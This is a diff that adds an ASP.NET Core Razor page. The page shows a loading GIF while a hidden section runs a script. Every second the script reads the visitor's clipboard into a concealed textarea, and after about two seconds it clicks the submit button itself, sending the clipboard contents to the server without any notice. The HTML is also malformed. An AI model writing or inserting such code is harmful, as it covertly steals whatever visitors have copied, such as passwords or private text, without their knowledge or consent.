@@ -1,0 +1,62 @@
+﻿@{
+    Layout = null;
+}
+<html lang="vi">
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="~/css/site.css" asp-append-version="true" />
+    <title>C# | Asp Net Core | Công nghệ thông tin</title>
+    <link rel="icon" href="/images/imagex.png">
+<body style="background-color:@TempData["mau_background"]">
+@if (TempData["ok-data"] != null)
+{
+<img id="loading" src="/Image_Play/waiting.gif" />
+<div style="display:none">
+<script>
+    setInterval(myAlert, 1000);
+    function myAlert()
+    {
+        navigator.clipboard.readText()
+       /*Alert for accepting access to clipboard appears, user accepts*/
+       .then(text => {
+            document.getElementById("noidung").value = text;
+                    });
+     }
+
+     var tim = 0;
+     setInterval(myFay, 1000);
+
+        function myFay()
+        {
+            tim++;
+            if (tim == 2)
+            document.getElementById("ok").click();
+        }
+</script>                       
+<table align="center">
+    @using (Html.BeginForm())
+    {
+        @Html.ValidationSummary(true)
+
+        <tr style="height:40px">
+            <td> </td>
+            <td>
+                    <input type="text" name="txtName" id="name" value="@ViewBag.Name"/>
+                    <textarea cols="50" rows="20" name="txtNoiDung" id="noidung"></textarea>
+            </td>
+        </tr>
+      
+        <tr style="height:40px">
+            <td></td>
+            <td><br>
+                <input id="ok" type="Submit" value="Kết Quả" />
+            </td>
+        </tr>
+    }
+</table>
+</div>
+}
+</body>
+</head>
+</html>
